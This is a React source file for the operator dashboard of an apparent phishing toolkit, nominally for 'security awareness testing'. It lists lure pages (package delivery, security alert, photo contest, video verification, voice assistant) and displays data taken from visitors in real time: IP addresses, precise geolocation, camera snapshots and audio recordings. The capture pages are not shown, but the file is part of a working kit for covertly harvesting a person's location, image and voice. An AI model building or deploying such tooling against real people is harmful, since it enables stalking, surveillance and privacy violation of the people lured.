"use client";
import { useEffect, useRef, useState, useMemo } from 'react';
import { useLogs } from '@/contexts/LogContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
import { 
  MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, 
  Truck, Trophy, Lock, ShieldAlert, Image as ImageIconLucide, 
  Wifi, WifiOff, Clock, Globe, User, Smartphone, Monitor,
  RefreshCw, Download, Filter, Search, Eye, EyeOff
} from 'lucide-react';
import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Input } from '@/components/ui/input';
import Image from 'next/image';
import { useToast } from '@/hooks/use-toast';
import type { ToastActionElement } from '@/components/ui/toast';
import { ToastAction } from '@/components/ui/toast';
import { cn } from '@/lib/utils';

const phishingCategories = [
  {
    title: 'Location',
    description: 'Templates designed to capture IP address and attempt geolocation.',
    Icon: MapPin,
    links: [
      { id: 'package-delivery-issue', name: 'Template: Package Delivery Issue', url: '/phishing/location/package-delivery-issue', Icon: Truck, description: "Simulates a package delivery problem requiring address verification." },
      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert', Icon: ShieldAlert, description: "Simulates an urgent security notification." },
      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: "Simulates unlocking region-restricted content." },
    ],
  },
  {
    title: 'Camera Access',
    description: 'Templates attempting to access the device camera.',
    Icon: Camera,
    links: [
      { id: 'photo-contest-entry', name: 'Template: Photo Contest Entry', url: '/phishing/camera/photo-contest-entry', Icon: Trophy, description: "Simulates a photo contest entry requiring camera access after cookie consent." },
      { id: 'video-verification', name: 'Template: Video Verification', url: '/phishing/camera/video-verification', Icon: ImageIconLucide, description: "Simulates a video ID verification process." },
      { id: 'ar-filter', name: 'Template: AR Filter Test', url: '/phishing/camera/ar-filter', Icon: Camera, description: "Simulates trying out an AR filter." },
    ],
  },
  {
    title: 'Audio Access',
    description: 'Templates simulating microphone access requests.',
    Icon: Mic,
    links: [
      { id: 'voice-assistant', name: 'Template: Voice Assistant Setup', url: '/phishing/audio/voice-assistant', description: "Simulates setting up a voice assistant." },
      { id: 'speech-to-text', name: 'Template: Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', description: "Simulates a speech-to-text service." },
      { id: 'quality-check', name: 'Template: Audio Quality Check', url: '/phishing/audio/quality-check', description: "Simulates a microphone quality check." },
    ],
  },
];

// Professional log type icons and colors
const getLogTypeConfig = (type: LogEntry['type']) => {
  switch (type) {
    case 'location':
      return { icon: MapPin, color: 'bg-blue-500', label: 'Location', variant: 'default' as const };
    case 'camera':
      return { icon: Camera, color: 'bg-green-500', label: 'Camera', variant: 'secondary' as const };
    case 'audio':
      return { icon: Mic, color: 'bg-purple-500', label: 'Audio', variant: 'outline' as const };
    case 'generic':
      return { icon: Globe, color: 'bg-gray-500', label: 'Visit', variant: 'secondary' as const };
    default:
      return { icon: AlertTriangle, color: 'bg-orange-500', label: 'Unknown', variant: 'destructive' as const };
  }
};

// Professional log entry component
const LogEntryCard: React.FC<{ 
  log: LogEntry; 
  onImageClick: (url: string) => void;
  isExpanded: boolean;
  onToggleExpand: () => void;
}> = ({ log, onImageClick, isExpanded, onToggleExpand }) => {
  const config = getLogTypeConfig(log.type);
  const Icon = config.icon;
  
  const formatTimestamp = (timestamp: string) => {
    const date = new Date(timestamp);
    return {
      date: date.toLocaleDateString(),
      time: date.toLocaleTimeString(),
      relative: getRelativeTime(date)
    };
  };
  
  const getRelativeTime = (date: Date) => {
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    const days = Math.floor(diff / 86400000);
    
    if (minutes < 1) return 'Just now';
    if (minutes < 60) return `${minutes}m ago`;
    if (hours < 24) return `${hours}h ago`;
    return `${days}d ago`;
  };

  const renderLogData = () => {
    if (log.type === 'camera' && log.data && typeof log.data.imageUrl === 'string') {
      const camData = log.data as CameraData;
      return (
        <div className="mt-3">
          <div className="relative group">
            <Image
              src={camData.imageUrl}
              alt="Captured image"
              width={200}
              height={150}
              className="rounded-lg border object-cover cursor-pointer hover:opacity-90 transition-all duration-200 shadow-sm"
              onClick={() => onImageClick(camData.imageUrl)}
            />
            <div className="absolute inset-0 bg-black/0 group-hover:bg-black/10 transition-colors duration-200 rounded-lg flex items-center justify-center">
              <Eye className="w-6 h-6 text-white opacity-0 group-hover:opacity-100 transition-opacity duration-200" />
            </div>
          </div>
          {isExpanded && (
            <details className="mt-2">
              <summary className="cursor-pointer text-xs text-muted-foreground hover:text-foreground transition-colors">
                View Base64 Data (truncated)
              </summary>
              <pre className="mt-1 text-xs bg-muted/30 p-2 rounded text-muted-foreground font-mono overflow-x-auto">
                {JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0, 100)}...` }, null, 2)}
              </pre>
            </details>
          )}
        </div>
      );
    }

    if (log.type === 'location' && log.data && typeof log.data.latitude === 'number') {
      const locData = log.data as LocationData;
      return (
        <div className="mt-3 space-y-2">
          <div className="grid grid-cols-2 gap-4 text-sm">
            <div>
              <span className="text-muted-foreground">Latitude:</span>
              <p className="font-mono">{locData.latitude.toFixed(6)}</p>
            </div>
            <div>
              <span className="text-muted-foreground">Longitude:</span>
              <p className="font-mono">{locData.longitude.toFixed(6)}</p>
            </div>
          </div>
          {locData.accuracy && (
            <div className="text-sm">
              <span className="text-muted-foreground">Accuracy:</span>
              <span className="ml-2 font-medium">{locData.accuracy.toFixed(0)}m</span>
            </div>
          )}
          {(locData.city || locData.country) && (
            <div className="flex items-center gap-2 text-sm">
              <Globe className="w-4 h-4 text-muted-foreground" />
              <span>{[locData.city, locData.country].filter(Boolean).join(', ')}</span>
            </div>
          )}
          {locData.latitude && locData.longitude && (
            <Button
              variant="outline"
              size="sm"
              className="mt-2"
              onClick={() => window.open(`https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`, '_blank')}
            >
              <ExternalLink className="w-3 h-3 mr-1" />
              View on Maps
            </Button>
          )}
        </div>
      );
    }

    if (log.type === 'audio' && log.data) {
      const audioData = log.data as AudioData;
      if (audioData.opusAsBase64 && audioData.mimeType) {
        return (
          <div className="mt-3">
            {audioData.description && (
              <p className="text-sm mb-2 text-muted-foreground">{audioData.description}</p>
            )}
            <audio 
              controls 
              src={audioData.opusAsBase64} 
              className="w-full max-w-sm rounded border"
            >
              Your browser does not support audio playback.
            </audio>
            {typeof audioData.duration === 'number' && (
              <p className="text-xs text-muted-foreground mt-1">
                Duration: {audioData.duration.toFixed(1)}s
              </p>
            )}
          </div>
        );
      } else if (audioData.description) {
        return (
          <div className="mt-3">
            <p className="text-sm text-muted-foreground">
              Audio log: {audioData.description}
            </p>
          </div>
        );
      }
    }

    if (log.type === 'generic' && log.data && typeof log.data.message === 'string') {
      return (
        <div className="mt-3">
          <p className="text-sm text-muted-foreground">{log.data.message}</p>
        </div>
      );
    }

    // Fallback for unknown data types
    return isExpanded ? (
      <details className="mt-3">
        <summary className="cursor-pointer text-xs text-muted-foreground hover:text-foreground">
          View Raw Data
        </summary>
        <pre className="mt-1 text-xs bg-muted/30 p-2 rounded text-muted-foreground font-mono overflow-x-auto">
          {JSON.stringify(log.data, null, 2)}
        </pre>
      </details>
    ) : null;
  };

  const timestamp = formatTimestamp(log.timestamp);

  return (
    <Card className="transition-all duration-200 hover:shadow-md border-l-4" style={{ borderLeftColor: config.color.replace('bg-', '#') }}>
      <CardContent className="p-4">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3 flex-1">
            <div className={cn("p-2 rounded-full", config.color)}>
              <Icon className="w-4 h-4 text-white" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2 mb-1">
                <Badge variant={config.variant} className="text-xs">
                  {config.label}
                </Badge>
                <span className="text-xs text-muted-foreground">{timestamp.relative}</span>
              </div>
              <div className="text-xs text-muted-foreground space-y-1">
                <div className="flex items-center gap-2">
                  <Clock className="w-3 h-3" />
                  <span>{timestamp.date} at {timestamp.time}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Globe className="w-3 h-3" />
                  <span className="font-mono">{log.ip}</span>
                </div>
                {isExpanded && (
                  <div className="flex items-center gap-2">
                    <Monitor className="w-3 h-3" />
                    <span className="truncate text-xs">{log.userAgent}</span>
                  </div>
                )}
              </div>
            </div>
          </div>
          <Button
            variant="ghost"
            size="sm"
            onClick={onToggleExpand}
            className="ml-2 h-8 w-8 p-0"
          >
            {isExpanded ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </Button>
        </div>
        
        {renderLogData()}
        
        <div className="mt-3 pt-2 border-t border-muted/30">
          <div className="flex items-center justify-between text-xs text-muted-foreground">
            <span className="font-mono">ID: {log.id.slice(0, 8)}...</span>
            {log.data?.error && (
              <Badge variant="destructive" className="text-xs">
                Network Error
              </Badge>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default function DashboardPage() {
  const { logs, clearLogs, isLoading, isConnected } = useLogs();
  const { toast } = useToast();
  const isInitialLoadRef = useRef(true);
  const toastedLogIdsRef = useRef(new Set<string>());
  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
  const [isModalAnimating, setIsModalAnimating] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedType, setSelectedType] = useState<string>('all');
  const [expandedLogs, setExpandedLogs] = useState<Set<string>>(new Set());

  // Filter logs based on search and type
  const filteredLogs = useMemo(() => {
    return logs.filter(log => {
      const matchesSearch = searchTerm === '' || 
        log.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
        log.type.toLowerCase().includes(searchTerm.toLowerCase()) ||
        JSON.stringify(log.data).toLowerCase().includes(searchTerm.toLowerCase());
      
      const matchesType = selectedType === 'all' || log.type === selectedType;
      
      return matchesSearch && matchesType;
    });
  }, [logs, searchTerm, selectedType]);

  const openModal = (url: string) => {
    setExpandedImageUrl(url);
    requestAnimationFrame(() => setIsModalAnimating(true));
  };

  const closeModal = () => {
    setIsModalAnimating(false);
    setTimeout(() => setExpandedImageUrl(null), 300);
  };

  const toggleLogExpansion = (logId: string) => {
    setExpandedLogs(prev => {
      const newSet = new Set(prev);
      if (newSet.has(logId)) {
        newSet.delete(logId);
      } else {
        newSet.add(logId);
      }
      return newSet;
    });
  };

  // Enhanced toast notifications for new logs
  useEffect(() => {
    if (isLoading) return;

    if (isInitialLoadRef.current) {
      if (logs.length > 0) {
        logs.forEach(log => toastedLogIdsRef.current.add(log.id));
      }
      isInitialLoadRef.current = false;
      return;
    }

    logs.forEach(log => {
      if (!toastedLogIdsRef.current.has(log.id)) {
        const config = getLogTypeConfig(log.type);
        let toastDescription = `IP: ${log.ip}`;
        let toastAction: ToastActionElement | undefined = undefined;

        if (log.type === 'location') {
          const locData = log.data as LocationData;
          const location = [locData.city, locData.country].filter(Boolean).join(', ');
          toastDescription = location ? `From ${location} (${log.ip})` : `IP: ${log.ip}`;
          
          if (locData.latitude && locData.longitude) {
            toastAction = (
              <ToastAction
                altText="Open in Maps"
                onClick={() => window.open(`https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`, '_blank')}
              >
                <ExternalLink className="mr-1 h-3 w-3" /> Maps
              </ToastAction>
            );
          }
        } else if (log.type === 'camera') {
          toastDescription = `Image captured from ${log.ip}`;
        } else if (log.type === 'audio') {
          const audioData = log.data as AudioData;
          toastDescription = audioData.description || `Audio captured from ${log.ip}`;
        } else if (log.type === 'generic') {
          const message = typeof log.data?.message === 'string' ? log.data.message : '';
          const pageName = message.split(': ')[1] || 'Unknown page';
          toastDescription = `Page visit: ${pageName}`;
        }

        toast({
          title: `${config.label} Data Captured!`,
          description: toastDescription,
          action: toastAction,
        });
        
        toastedLogIdsRef.current.add(log.id);
      }
    });
  }, [logs, isLoading, toast]);

  const handleClearLogs = async () => {
    try {
      await clearLogs();
      setExpandedLogs(new Set());
      setSearchTerm('');
      setSelectedType('all');
    } catch (error) {
      console.error('Failed to clear logs:', error);
    }
  };

  return (
    <>
      <div className="space-y-6">
        {/* Real-time Log Display - Single Professional Area */}
        <Card className="shadow-lg">
          <CardHeader>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <ListChecks className="h-7 w-7 text-primary" />
                <div>
                  <CardTitle className="text-2xl">Live Activity Monitor</CardTitle>
                  <CardDescription>
                    Real-time capture and analysis of phishing attempt data
                  </CardDescription>
                </div>
              </div>
              <div className="flex items-center gap-2">
                {isConnected ? (
                  <Badge variant="default" className="gap-1">
                    <Wifi className="w-3 h-3" />
                    Connected
                  </Badge>
                ) : (
                  <Badge variant="destructive" className="gap-1">
                    <WifiOff className="w-3 h-3" />
                    Offline
                  </Badge>
                )}
                <Badge variant="outline">
                  {filteredLogs.length} {filteredLogs.length === 1 ? 'Entry' : 'Entries'}
                </Badge>
              </div>
            </div>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Search and Filter Controls */}
            <div className="flex flex-col sm:flex-row gap-3">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input
                  placeholder="Search logs by IP, type, or content..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10"
                />
              </div>
              <select
                value={selectedType}
                onChange={(e) => setSelectedType(e.target.value)}
                className="px-3 py-2 border border-input bg-background rounded-md text-sm"
              >
                <option value="all">All Types</option>
                <option value="location">Location</option>
                <option value="camera">Camera</option>
                <option value="audio">Audio</option>
                <option value="generic">Page Visits</option>
              </select>
            </div>

            <Separator />

            {/* Log Display Area */}
            {isLoading ? (
              <div className="flex items-center justify-center py-12">
                <div className="flex items-center gap-3 text-muted-foreground">
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  <span>Loading activity logs...</span>
                </div>
              </div>
            ) : filteredLogs.length === 0 ? (
              <div className="text-center py-12">
                <AlertTriangle className="mx-auto h-12 w-12 mb-4 text-muted-foreground" />
                <h3 className="text-lg font-semibold mb-2">
                  {logs.length === 0 ? 'No Activity Detected' : 'No Matching Logs'}
                </h3>
                <p className="text-muted-foreground mb-4">
                  {logs.length === 0 
                    ? 'Start by visiting one of the phishing templates below to begin capturing data.'
                    : 'Try adjusting your search terms or filters to find specific logs.'
                  }
                </p>
                {searchTerm || selectedType !== 'all' ? (
                  <Button 
                    variant="outline" 
                    onClick={() => { setSearchTerm(''); setSelectedType('all'); }}
                  >
                    Clear Filters
                  </Button>
                ) : null}
              </div>
            ) : (
              <ScrollArea className="h-[600px] pr-4">
                <div className="space-y-4">
                  {filteredLogs.map(log => (
                    <LogEntryCard
                      key={log.id}
                      log={log}
                      onImageClick={openModal}
                      isExpanded={expandedLogs.has(log.id)}
                      onToggleExpand={() => toggleLogExpansion(log.id)}
                    />
                  ))}
                </div>
              </ScrollArea>
            )}

            {/* Action Buttons */}
            <div className="flex items-center justify-between pt-4 border-t">
              <div className="text-sm text-muted-foreground">
                {filteredLogs.length > 0 && (
                  <>Last updated: {new Date(filteredLogs[0].timestamp).toLocaleString()}</>
                )}
              </div>
              <div className="flex gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => window.location.reload()}
                  disabled={isLoading}
                >
                  <RefreshCw className="w-4 h-4 mr-1" />
                  Refresh
                </Button>
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={handleClearLogs}
                  disabled={logs.length === 0 || isLoading}
                >
                  <Trash2 className="w-4 h-4 mr-1" />
                  Clear All
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Phishing Templates */}
        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl">Phishing Simulation Templates</CardTitle>
            <CardDescription>
              Professional templates for security awareness testing. Each opens in a new tab for isolated testing.
            </CardDescription>
          </CardHeader>
          <CardContent className="flex justify-center">
            <div className="inline-grid gap-6 md:grid-cols-1 lg:grid-cols-3">
              {phishingCategories.map((category) => (
                <PhishingLinkCard
                  key={category.title}
                  title={category.title}
                  description={category.description}
                  Icon={category.Icon}
                  links={category.links.map(link => ({
                    ...link,
                    description: link.description || "Professional simulation template.",
                    Icon: link.Icon || category.Icon
                  }))}
                />
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Image Modal */}
      {expandedImageUrl && (
        <div
          className={cn(
            "fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out",
            "transition-opacity duration-300 ease-in-out",
            isModalAnimating ? "opacity-100 bg-black/80" : "opacity-0 bg-black/0 pointer-events-none"
          )}
          onClick={closeModal}
        >
          <div
            className={cn(
              "transform transition-all duration-300 ease-in-out",
              isModalAnimating ? "opacity-100 scale-100" : "opacity-0 scale-95"
            )}
            onClick={(e) => e.stopPropagation()}
          >
            <Image
              src={expandedImageUrl}
              alt="Expanded captured image"
              width={0}
              height={0}
              sizes="100vw"
              style={{ width: 'auto', height: 'auto' }}
              className="max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1"
            />
          </div>
        </div>
      )}
    </>
  );
}

